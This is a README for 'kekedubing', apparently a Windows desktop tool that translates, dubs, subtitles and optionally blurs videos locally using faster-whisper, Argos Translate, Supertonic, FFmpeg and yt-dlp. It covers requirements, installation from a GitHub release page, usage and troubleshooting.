# 🎙️ kekedubing - Translate and dub your videos locally

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/pumpactionatf235/kekedubing)

This application translates, dubs, and adds subtitles to your video files on your own computer. It uses machine learning to maintain your privacy because no data leaves your device. You keep total control over your media files.

## ⚙️ System Requirements

To run this tool, your computer needs a few basic things:

* Windows 10 or Windows 11.
* A modern processor with at least 4 cores.
* 8 GB of internal memory (RAM).
* 5 GB of free space on your hard drive.
* A decent graphics card (NVIDIA recommended for faster processing).

## 📥 How to Install

1. Visit the [official release page](https://github.com/pumpactionatf235/kekedubing) to see all versions.
2. Look for the latest version number at the top of the list.
3. Click the file that ends in .exe to download the installer.
4. Run the installer and follow the prompts on your screen.
5. Launch the application from your desktop shortcut once the install finishes.

## 🛠️ How it Works

The tool combines several powerful technologies to process your video:

* Faster-whisper for accurate speech recognition.
* Argos Translate to convert text into other languages.
* Supertonic to handle high-quality audio generation.
* FFmpeg to package your video and audio tracks together.
* yt-dlp to grab content from the web if you provide a link.

## 🚀 Using the Application

Open the app to see the main dashboard. Follow these steps to process a video:

1. **Select your file:** Click the Browse button to pick a video file from your computer. You can also paste a web link if you want to download a video directly.
2. **Choose your language:** Select your source language and the language you want to hear in the dubbed version.
3. **Pick your settings:** Choose if you want subtitles, dubbing, or both. You can also turn on the blur effect if you need to hide sensitive parts of the screen.
4. **Start the task:** Click the Process button. The application will show a progress bar. Wait for the task to finish. You can track the status in the log window below the main controls.
5. **View your results:** The app saves your finished video in the folder named Outputs on your desktop.

## 🔍 Understanding the Features

This tool offers several features to make video translation simple.

### Video Dubbing
The app replaces the original voice with a new audio track. It matches the rhythm of the spoken words to the video frames. 

### Subtitle Generation
It creates subtitle files that you can toggle on or off in your favorite video player. The tool generates these files in the standard SRT format.

### Blur Effect
If your video contains private information or faces that need protection, use the blur setting. The software identifies areas that need obscuring based on your configuration.

## 🆘 Troubleshooting Common Issues

If you run into issues, try these common fixes:

* **The process stops suddenly:** Ensure your computer has enough free space. High-quality video files require significant temp space during processing.
* **The software is slow:** If you have an NVIDIA graphics card, check that your drivers are up to date. Using a GPU significantly speeds up the translation process.
* **Audio sounds strange:** Check your source audio. Very noisy backgrounds make it hard for the translation engine to hear the words. Clear audio leads to better results.
* **Missing files:** If you do not see your output, check the Settings menu to verify your output directory location.

## 📝 Performance Tips

Keep these tips in mind to get the best results:

* Close other resource-heavy programs like video games or web browsers while you process long videos. 
* Use the Preview mode for short clips to test your settings before processing an entire movie. 
* Keep your computer plugged into power if you use a laptop to prevent the battery from draining during a task.
* Save your project files often if you use custom presets for different translation tasks.
